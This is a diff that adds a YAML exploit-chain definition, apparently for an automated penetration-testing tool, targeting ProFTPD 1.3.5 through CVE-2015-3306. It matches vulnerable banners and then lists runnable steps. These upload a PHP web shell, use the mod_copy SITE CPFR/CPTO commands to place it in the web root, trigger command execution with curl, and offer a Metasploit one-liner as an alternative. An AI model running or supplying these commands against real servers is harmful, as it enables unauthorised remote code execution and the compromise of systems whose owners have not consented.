@@ -1,0 +1,42 @@
+chain_id: proftpd_mod_copy_cve_2015_3306
+title: "ProFTPD 1.3.5 — CVE-2015-3306 mod_copy unauthenticated RCE"
+severity: CRITICAL
+tags: [ftp, proftpd, cve-2015-3306, mod_copy, rce]
+
+trigger:
+  any_of:
+    - { product_pattern: "(?i)proftpd.*1\\.3\\.5" }
+    - { banner_pattern: "(?i)proftpd 1\\.3\\.5" }
+
+description: |
+  ProFTPD 1.3.5 with mod_copy enabled lets unauthenticated users invoke
+  the SITE CPFR/CPTO commands to copy any readable file anywhere
+  writable by the FTP user. Standard chain: copy a PHP payload from a
+  writable temp dir into /var/www/html and request it.
+
+steps:
+  - id: 1
+    title: "Write a PHP payload into /tmp via FTP"
+    command: |
+      ftp $VICTIMA
+      put shell.php /tmp/shell.php
+
+  - id: 2
+    title: "Use mod_copy to move it into the docroot"
+    command: |
+      ftp $VICTIMA
+      SITE CPFR /tmp/shell.php
+      SITE CPTO /var/www/html/shell.php
+
+  - id: 3
+    title: "Trigger"
+    command: curl 'http://$VICTIMA/shell.php?cmd=id'
+
+  - id: 4
+    title: "Or single-shot with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/unix/ftp/proftpd_modcopy_exec; \
+        set RHOSTS $VICTIMA; set SITEPATH /var/www/html; run'
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2015-3306
